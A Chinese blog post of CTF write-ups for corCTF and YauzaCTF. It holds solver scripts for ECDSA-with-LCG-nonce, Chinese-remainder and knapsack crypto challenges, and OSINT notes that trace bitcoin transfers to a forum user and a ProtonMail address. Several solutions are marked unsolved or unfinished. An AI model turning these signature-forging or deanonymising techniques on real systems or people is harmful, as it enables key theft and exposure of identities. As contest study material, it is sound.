<h2 id="Crypto-LCG-k（unsolved）"><a href="#Crypto-LCG-k（unsolved）" class="headerlink" title="Crypto-LCG_k（unsolved）"></a>Crypto-LCG_k（unsolved）</h2><p>对<a href="https://lazzzaro.github.io/2020/11/07/crypto-ECC/">ECDSA</a>没有了解过，做到一半发现求不出来d，搜了发现是椭圆曲线签名，找了la佬和<a href="https://www.sebven.com/ctf/2021/08/23/corCTF2021-LCG_k.html">一位师傅的WP</a>去学习了下</p>
<hr>
<p>LCG？Hey everybody在你头上暴扣</p>
<blockquote>
<p>Can you sign my message for me?</p>
<p>nc crypto.be.ax 6002</p>
</blockquote>
<p>首先我们来看最后的<code>verify</code>部分</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;now, i want you to sign my message.&#x27;</span>)</span><br><span class="line">r = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;give me r&gt;&#x27;</span>))</span><br><span class="line">s = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;give me s&gt;&#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> verify(r, s, mymsg):</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;nice. i&#x27;ll give you the flag.&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;no, that&#x27;s wrong.&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>想要verify成功，获得flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">r, s, m</span>):</span></span><br><span class="line">	v1 = H(m)*inverse(s, N) % N</span><br><span class="line">	v2 = r*inverse(s, N) % N</span><br><span class="line">	V = v1*G + v2*pub</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">int</span>(V.x) % N == r</span><br></pre></td></tr></table></figure>

<p>总结一下就是输入r和s，其他的我们都知道，使得该式子成立<br>$$<br>ms^{-1}x+rs^{-1}xd\equiv _nr<br>$$<br>而第一层呢，既是hint，也是我们必须通过的关卡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	m = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&#x27;give me something to sign, in hex&gt;&#x27;</span>))</span><br><span class="line">	h = H(m)</span><br><span class="line">	<span class="keyword">if</span> m == mymsg <span class="keyword">or</span> h <span class="keyword">in</span> signed_hashes:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;i won&#x27;t sign that.&quot;</span>)</span><br><span class="line">		exit()</span><br><span class="line">	signed_hashes.append(h)</span><br><span class="line">	r, s = sign(m)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;r:&#x27;</span>, <span class="built_in">str</span>(r))</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;s:&#x27;</span>, <span class="built_in">str</span>(s))</span><br></pre></td></tr></table></figure>

<p>看下具体签名的过程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span>(<span class="params">m</span>):</span></span><br><span class="line">	k = <span class="built_in">next</span>(gen)</span><br><span class="line">	r = <span class="built_in">int</span>((k*G).x) % N</span><br><span class="line">	s = ((H(m) + d*r)*inverse(k, N)) % N</span><br><span class="line">	<span class="keyword">return</span> r, s</span><br></pre></td></tr></table></figure>

<p>$$<br>r=kx\ mod\ n<br>$$<br>$$<br>s=(m+rd)\cdot k^{-1}\ mod\ n<br>$$</p>
<p>LCG已知模数还可以知道四个状态，可爆</p>
<p>所以应该前面两个状态是用来得到乘数和增量，然后emmmmm似乎求出来LCG也没用，因为不需要预测随机数，而且每次k都可以通过r来算到；所以直接求d吧</p>
<p>我以为的求d<br>$$<br>(sk-m)\cdot r^{-1}\equiv_n d<br>$$<br>不是$d\in [0,\ n)$吗，左边求出来的不就是d吗，但是操作过后确实不是，暂时不理解；有师傅可以评论区告诉我吗</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># nc crypto.be.ax 6002</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, inverse</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> fastecdsa.curve <span class="keyword">import</span> P256</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;crypto.be.ax&#x27;</span>, <span class="number">6002</span>)</span><br><span class="line">G = P256.G</span><br><span class="line">N = P256.q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">H</span>(<span class="params">m</span>):</span></span><br><span class="line">	h = sha256()</span><br><span class="line">	h.update(m)</span><br><span class="line">	<span class="keyword">return</span> bytes_to_long(h.digest())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">	<span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">return</span> b, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		g, y, x = egcd(b % a, a)</span><br><span class="line">		<span class="keyword">return</span> g, x - (b // a) * y, y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a, m</span>):</span></span><br><span class="line">	g, x, y = egcd(a, m)</span><br><span class="line">	<span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_increment</span>(<span class="params">states, m, a</span>):</span></span><br><span class="line">	b = (states[<span class="number">1</span>] - states[<span class="number">0</span>] * a) % m</span><br><span class="line">	<span class="keyword">return</span> m, a, b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_multiplier</span>(<span class="params">states, m</span>):</span></span><br><span class="line">	a = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * modinv(states[<span class="number">1</span>] - states[<span class="number">0</span>], m) % m</span><br><span class="line">	<span class="keyword">return</span> crack_unknown_increment(states, m, a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># LCG part</span></span><br><span class="line">sequence = []</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	inv = invert(G.x, N)</span><br><span class="line">	sh.recvuntil(<span class="string">b&#x27;give me something to sign, in hex&gt;&#x27;</span>)</span><br><span class="line">	sh.sendline(<span class="built_in">str</span>(m).encode().<span class="built_in">hex</span>())</span><br><span class="line">	sh.recvuntil(<span class="string">b&#x27;r:&#x27;</span>)</span><br><span class="line">	r = <span class="built_in">int</span>(sh.recvline().decode())</span><br><span class="line">	sh.recvuntil(<span class="string">b&#x27;s:&#x27;</span>)</span><br><span class="line">	s = <span class="built_in">int</span>(sh.recvline().decode())</span><br><span class="line">	k = (<span class="built_in">int</span>(r) * <span class="built_in">int</span>(inv)) % N</span><br><span class="line">	d = ((<span class="built_in">int</span>(s) * k - H(<span class="built_in">str</span>(m).encode())) * <span class="built_in">int</span>(invert(<span class="built_in">int</span>(r), N))) % N</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;d =&#x27;</span>, d)</span><br><span class="line"><span class="comment"># d = 111794286037145166785531145837405642417111081891011940999958121590200481323527</span></span><br><span class="line"><span class="comment"># d = 32439466539999346636384702841656953540974828530354787685779441994658571451022</span></span><br><span class="line"><span class="comment"># d = 10926244771926014704519302388552973799549625394927395188718476150973064437377</span></span><br><span class="line"><span class="comment"># d = 114762443346016561170498759027815574796335775581660017547791545655526389133816</span></span><br></pre></td></tr></table></figure>

<hr>
<p>师傅说是椭圆曲线数字签名算法，尝试从标准的密码系统上找这里的漏洞</p>
<p>开学了，事情比较多，还是一样的烦心，呵，有空再回来整理了</p>
<h1 id="YauzaCTF"><a href="#YauzaCTF" class="headerlink" title="YauzaCTF"></a>YauzaCTF</h1><p>战斗民族的比赛，密码题略少，网站开得了，但是文件下载很慢，但我的网还是在努力下载了，为了我的复现</p>
<p>OSINT主要是看到TIME上的WP，这个方向也挺好玩的，所以想跟着<a href="https://kashmir54.github.io/ctfs/YauzaCTF2021/#get-in-touch">果歪的师傅</a>复现下这两道题，也是看下OSINT手一般会用哪些工具</p>
<h2 id="Crypto-Sharing-secrets"><a href="#Crypto-Sharing-secrets" class="headerlink" title="Crypto-Sharing secrets"></a>Crypto-Sharing secrets</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> storage <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">x</span>):</span></span><br><span class="line">    m = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">        m *= i</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    flag = bytes_to_long(flag.encode())</span><br><span class="line"></span><br><span class="line">    count = <span class="number">25</span></span><br><span class="line">    threshold = <span class="number">11</span></span><br><span class="line">    psize = <span class="number">24</span></span><br><span class="line"></span><br><span class="line">    primes = <span class="built_in">list</span>(<span class="built_in">sorted</span>(getPrime(psize) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(count)))</span><br><span class="line"></span><br><span class="line">    pmin = mul(primes[-threshold + <span class="number">1</span>:])</span><br><span class="line">    pmax = mul(primes[:threshold])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> pmin &lt; flag &lt; pmax</span><br><span class="line"></span><br><span class="line">    shadows = [flag % x <span class="keyword">for</span> x <span class="keyword">in</span> primes]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;secrets.json&#x27;</span>, <span class="string">&#x27;wt&#x27;</span>) <span class="keyword">as</span> out_file:</span><br><span class="line">        out_file.write(json.dumps(&#123;</span><br><span class="line">            <span class="string">&#x27;shadows&#x27;</span>: shadows[<span class="number">1</span>:threshold],</span><br><span class="line">            <span class="string">&#x27;primes&#x27;</span>: primes[:threshold],</span><br><span class="line">            <span class="string">&#x27;threshold&#x27;</span>: threshold</span><br><span class="line">        &#125;))</span><br></pre></td></tr></table></figure>

<p>中国剩余定理模数不够，稍微爆破就出来了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">shadows = [<span class="number">7832917</span>, <span class="number">8395798</span>, <span class="number">4599919</span>, <span class="number">154544</span>, <span class="number">3430534</span>, <span class="number">4694683</span>, <span class="number">123690</span>, <span class="number">5911445</span>, <span class="number">7380167</span>, <span class="number">10597668</span>]</span><br><span class="line">primes = [<span class="number">8412883</span>, <span class="number">8889941</span>, <span class="number">9251479</span>, <span class="number">9471269</span>, <span class="number">9503671</span>, <span class="number">9723401</span>, <span class="number">10092149</span>, <span class="number">10389901</span>, <span class="number">10551241</span>, <span class="number">10665527</span>, <span class="number">11099951</span>]</span><br><span class="line">threshold = <span class="number">11</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">x</span>):</span></span><br><span class="line">    m = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">        m *= i</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_m = crt(shadows, primes[<span class="number">1</span>:])</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10000000</span>):</span><br><span class="line">    mi = fake_m + mul(primes[<span class="number">1</span>:]) * j</span><br><span class="line">    flag = long_to_bytes(mi)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;YauzaCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>YauzaCTF{k33p_1t_1n_7h3_sh4d0w5}</p>
</blockquote>
<h2 id="Crypto-Knapsack（unsolved）"><a href="#Crypto-Knapsack（unsolved）" class="headerlink" title="Crypto-Knapsack（unsolved）"></a>Crypto-Knapsack（unsolved）</h2><p><a href="https://blog.csdn.net/m0_49109277/article/details/120085932?spm=1001.2014.3001.5501">背包</a>，为什么我没有在遇到WM之前遇到这道题</p>
<p>只给了flag和pubkey，应该和WM的checkin大同小异，flag是加密后得到的结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = [<span class="number">12777998288638</span>, <span class="number">10593582832873</span>, <span class="number">7834439533378</span>, <span class="number">10486500991495</span>, <span class="number">14714582460036</span>, <span class="number">7568907598905</span>, <span class="number">12800035735033</span>, <span class="number">14724457772647</span>, <span class="number">11910445040159</span>, <span class="number">11202963622894</span>, <span class="number">10291238568620</span>, <span class="number">15103559399914</span>, <span class="number">13156142631772</span>, <span class="number">16988824411176</span>]</span><br><span class="line">pubkey = [<span class="number">2948549611747</span>, <span class="number">2043155587142</span>, <span class="number">361533419625</span>, <span class="number">1001380428657</span>, <span class="number">2438250374319</span>, <span class="number">1059738568330</span>, <span class="number">115120002311</span>, <span class="number">198226659880</span>, <span class="number">2343897184958</span>, <span class="number">2592576935132</span>, <span class="number">2327834076450</span>, <span class="number">237536244289</span>, <span class="number">309228208827</span>, <span class="number">3327276767693</span>, <span class="number">462372704541</span>, <span class="number">2176574227058</span>]</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<blockquote>
<p>I decided to keep the secret in my knapsack, so it’s safer.</p>
</blockquote>
<p>用WM的脚本跑出来这个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = [<span class="number">34458</span>, <span class="number">24238</span>, <span class="number">49798</span>, <span class="number">25130</span>, <span class="number">14046</span>, <span class="number">11468</span>, <span class="number">40662</span>, <span class="number">55034</span>, <span class="number">11382</span>, <span class="number">52750</span>, <span class="number">54828</span>, <span class="number">9978</span>, <span class="number">46636</span>, <span class="number">48758</span>]</span><br></pre></td></tr></table></figure>

<p>然后就没想到了；看这出题量是简单题啊，没道理啊，WM白复现了</p>
<h2 id="OSINT-Stolen-Capitalism（unsolved）"><a href="#OSINT-Stolen-Capitalism（unsolved）" class="headerlink" title="OSINT-Stolen Capitalism（unsolved）"></a>OSINT-Stolen Capitalism（unsolved）</h2><blockquote>
<p><strong>English</strong> Someone stole bitcoins from the wallet of our Party<br><code>bc1qtmyn49urgfu27n30zrghl8499sx42pqrhpm8xt</code>.</p>
<p>Find the real name of the thief. The flag matches the specified format.</p>
</blockquote>
<p>偷了比特币，找出小偷的真实姓名</p>
<hr>
<p>稍微去了解了下比特币是什么，随便找了几个视频看了下</p>
<p>比特币是一种数字货币（现在大约有4000多种数字货币，比特币占56%），单位BTC，可以精确到小数点后面很多位；有很多网站和app是用来做比特币交易的</p>
<p>题目中给的这一串<code>bc1qtmyn49urgfu27n30zrghl8499sx42pqrhpm8xt</code>就是某人的<code>bitcoin address</code>，一个人可以拥有多个<code>bitcoin address</code>，由算法生成独一无二的<code>bitcoin address</code>；它的用法有点像支付宝的收款码</p>
<p>重点来了，比特币的每一笔交易都会记录起来，而记录的手段就是著名的区块链，<strong>去中心化</strong>是其一个基本的思想，每十分钟都会产生一个新的区块链记录这段时间之内发生的交易；这个链子包含从比特币开始到现在的所有记录。然后有一个很魔性的东西，到底是区块链呢，<code>区块链就是比特币，比特币就是区块链</code>。一个区块链里面<strong>50</strong>个比特币。</p>
<p>更重点的来了。那么区块链由谁来记录呢？首先肯定是要有人来记录的，来维持整个系统。而做这项工作的人的回报就是比特币。这些人被称为<code>bitcoin miner</code>，也就是挖矿。显然挖比特币的成本就是你的电脑和算力，越多人挖，就越难挖到，也就让比特币的价值变得更高，因为花原来相同的时间挖到比特币的少了</p>
<p>比特币有一个优点，就是不会随着比特币的数量增多而贬值，因为每过四年，一个区块链里的比特币就会减少一半；所以显然，就像黄金一样，比特币是有限的</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905143832950.png" alt="image-20210905143832950"></p>
<p>一些有助于理解的细节</p>
<ul>
<li>每十分钟产生的区块有1M大小，记录约4000条交易信息</li>
<li>需要解决几个问题：<ol>
<li><strong>为何记账</strong>：因为有手续续费（由转出方支付），有<strong>打包奖励</strong></li>
<li><strong>以谁为准</strong>：每个包只能由一个人来打，谁能给出<strong>工作量证明</strong>谁就能打包；而这个就理解成一个要通过计算机枚举才能解出的数学题吧；这也就是上面说的挖矿了，这相当于比特币的扩散手段</li>
<li>挖矿的原理：<code>HASH=SHA256(SHA256(每人都一样的头部信息+每个人各自收集到的账单+时间戳+随机数))</code>，要求HASH值的二进制数前n位是0，因此目前来说只能爆破随机数；为了匹配当前所有矿机的算力，n一般设置为66，<em>当然这可以推导</em></li>
<li>身份认证以及双重支付、篡改等问题，用到密码学、区块链追溯、消息放弃，最长链原则等</li>
</ol>
</li>
</ul>
<hr>
<p>开始整活</p>
<p>那么显然我党的钱包地址<code>bc1qtmyn49urgfu27n30zrghl8499sx42pqrhpm8xt</code>有转出，由于区块链的广播公开，网上肯定可以转出的信息</p>
<p>直接搜有点看不懂，可以用<a href="https://www.blockchain.com/btc/address/bc1qtmyn49urgfu27n30zrghl8499sx42pqrhpm8xt">页面更好一点的</a>，这里有每一账户所有的交易信息</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905170035485.png" alt="image-20210905170035485"></p>
<p>只有两条可以看到18号<br><code>bc1q27u4g7svl4adwqzp2ds6g6gapph4azpvxj69wm</code>转给<br><code>bc1qtmyn49urgfu27n30zrghl8499sx42pqrhpm8xt</code>0.00048209BTC，在23号<br><code>bc1qtmyn49urgfu27n30zrghl8499sx42pqrhpm8xt</code>又向<br><code>bc1q0lpcsvr6p2lg0wrmwge548x0yau943n9vljzsr</code>转了这笔钱</p>
<p>显然<code>bc1q0lpcsvr6p2lg0wrmwge548x0yau943n9vljzsr</code>就是我们下一步追踪的线索</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905170840050.png" alt="image-20210905170840050"></p>
<p>接着又是只有唯一的支出<code>bc1qcrf4najrlj6pwynxhywlp3h3qzazvthrdp5ta3</code></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905172341869.png" alt="image-20210905172341869"></p>
<p>接着是给两个账户转账：<br><code>bc1qeaxw4s92ajf939z280rmycq2vw39scvqv573yu</code>和<code>bc1qz3n89hjq4rrlzsna3pdrygslum7v4slf8qpm8h</code></p>
<p>可以验证，到此为止，这笔钱在到了最后这两个账户后就没有转出记录了</p>
<p>那这四个中，谁是小偷呢？</p>
<blockquote>
<p>bc1q0lpcsvr6p2lg0wrmwge548x0yau943n9vljzsr</p>
<p>bc1qcrf4najrlj6pwynxhywlp3h3qzazvthrdp5ta3</p>
<p>bc1qeaxw4s92ajf939z280rmycq2vw39scvqv573yu</p>
<p>bc1qz3n89hjq4rrlzsna3pdrygslum7v4slf8qpm8h</p>
</blockquote>
<p>我们用搜索引擎合理搜索，出了关于<code>bitcoin address</code>有关的信息外，在四个中，只有<code>bc1qz3n89hjq4rrlzsna3pdrygslum7v4slf8qpm8h</code>会出来一条特别的信息<br><a href="https://antichat.com/members/413903/">https://antichat.com/members/413903/</a></p>
<p>是一个匿名聊天的平台，可以搜到这位id为<code>Tovarishch</code>的一些信息，这里的捐赠就是我们上面找到的比特币地址</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905173855411.png" alt="image-20210905173855411"></p>
<p>除此之外还能看到一个protonmail邮箱<code>tovarishch123@protonmail.com</code>，师傅说可以用ProtOSINT 去获取更多信息</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905180028573.png" alt="image-20210905180028573"></p>
<p>看到公钥文件是PGP的公钥。Pretty Good Privacy (PGP) 是一种加密系统，用于发送加密电子邮件和加密敏感文件；从创建的日期看也是为了比赛而创建的，方向应该没错</p>
<p>我试过用<a href="https://keyserver.pgp.com/vkd/SubmitSearch.event">keyserver</a>搜索</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905182701244.png" alt="image-20210905182701244"></p>
<p>也和用师傅所说的Kleopatra去看了下，反正就是没有的</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905183433438.png" alt="image-20210905183433438"></p>
<p>我尝试直接用搜索引擎去搜索，在StopForumSpam一个阻止机器人垃圾邮件的论坛上，搜到了该邮箱的踪影</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905184242169.png" alt="image-20210905184242169"></p>
<p>同一个ip地址下有这两封邮件</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905184820552.png" alt="image-20210905184820552"></p>
<p>但用户名提交都不对</p>
<p>没事，那个匿名聊天平台还有别的信息，总共有两篇帖子，这个翻译。。</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905190311365.png" alt="image-20210905190311365"></p>
<p>师傅说是<code>Reliable mixers Msg: Recommend a good proven bitcoin mixer Msg (rusky)</code>，和比特币混合器有关，反正就是龟孙没跑了</p>
<p>另外一篇是转发<a href="https://www.youtube.com/watch?v=DMoCM_FgLP8">YouTube上的视频</a></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905190941131.png" alt="image-20210905190941131"></p>
<p>这个条评论确实可疑</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905194152477.png" alt="image-20210905194152477"></p>
<p>然后剩下是师傅整理的一些时间节点</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905194255161.png" alt="image-20210905194255161"></p>
<p>感觉前面都挺顺利和确定的，但是从这个视频开始，一切就不确定起来</p>
<p>专业的师傅不会，业余的我更不会了哈哈哈哈，虽然这道题比下一道出的更多</p>
<h2 id="OSINT-Get-in-touch（recuring）"><a href="#OSINT-Get-in-touch（recuring）" class="headerlink" title="OSINT-Get in touch（recuring）"></a>OSINT-Get in touch（recuring）</h2><blockquote>
<p><strong>English</strong>: Our best agent is going to send us a message from an enemy country. But instead, he just posted some stupid player on his page! Find his public key immediately and send us the first 42 symbols in an appropriate form so we can be sure it’s him. For example, YAUZActf{Tgj8t6gbK9zlv4Xmivyhttjzvfbbp7nuqkce3uuomF}</p>
<p><code>tasks.yauzactf.com:30010</code></p>
</blockquote>
<p>提供的是网址，我还以为nc；浏览器打开之后，有几个YouTube的视频</p>
<p>可以看一下网页源码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">&quot;background-color: red;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.plyr.io/3.6.8/plyr.css&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.plyr.io/3.6.8/plyr.polyfilled.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">hidden</span> <span class="attr">class</span>=<span class="string">&quot;plyr__video-embed&quot;</span> <span class="attr">id</span>=<span class="string">&quot;player1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">        <span class="attr">src</span>=<span class="string">&quot;https://www.youtube.com/embed/DMoCM_FgLP8&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allowfullscreen</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allowtransparency</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allow</span>=<span class="string">&quot;autoplay&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">hidden</span> <span class="attr">class</span>=<span class="string">&quot;plyr__video-embed&quot;</span> <span class="attr">id</span>=<span class="string">&quot;player2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">        <span class="attr">src</span>=<span class="string">&quot;https://www.youtube.com/embed/Bwf9f498Yqs&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allowfullscreen</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allowtransparency</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allow</span>=<span class="string">&quot;autoplay&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">hidden</span> <span class="attr">class</span>=<span class="string">&quot;plyr__video-embed&quot;</span> <span class="attr">id</span>=<span class="string">&quot;player3&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">        <span class="attr">src</span>=<span class="string">&quot;https://www.youtube.com/embed/o2mD5hv0eMc&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allowfullscreen</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allowtransparency</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allow</span>=<span class="string">&quot;autoplay&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">which_playlist_i_want_to_listen</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> currenthour = <span class="keyword">new</span> <span class="built_in">Date</span>().getHours(); </span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">switch</span>(currenthour % <span class="number">3</span>) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">case</span> <span class="number">0</span>:</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> elem = <span class="built_in">document</span>.getElementById(<span class="string">&quot;player1&quot;</span>);</span></span><br><span class="line"><span class="javascript">            elem.removeAttribute(<span class="string">&quot;hidden&quot;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">case</span> <span class="number">1</span>:</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> elem = <span class="built_in">document</span>.getElementById(<span class="string">&quot;player2&quot;</span>);</span></span><br><span class="line"><span class="javascript">            elem.removeAttribute(<span class="string">&quot;hidden&quot;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">case</span> <span class="number">2</span>:</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> elem = <span class="built_in">document</span>.getElementById(<span class="string">&quot;player3&quot;</span>);</span></span><br><span class="line"><span class="javascript">            elem.removeAttribute(<span class="string">&quot;hidden&quot;</span>);</span></span><br><span class="line"><span class="javascript">          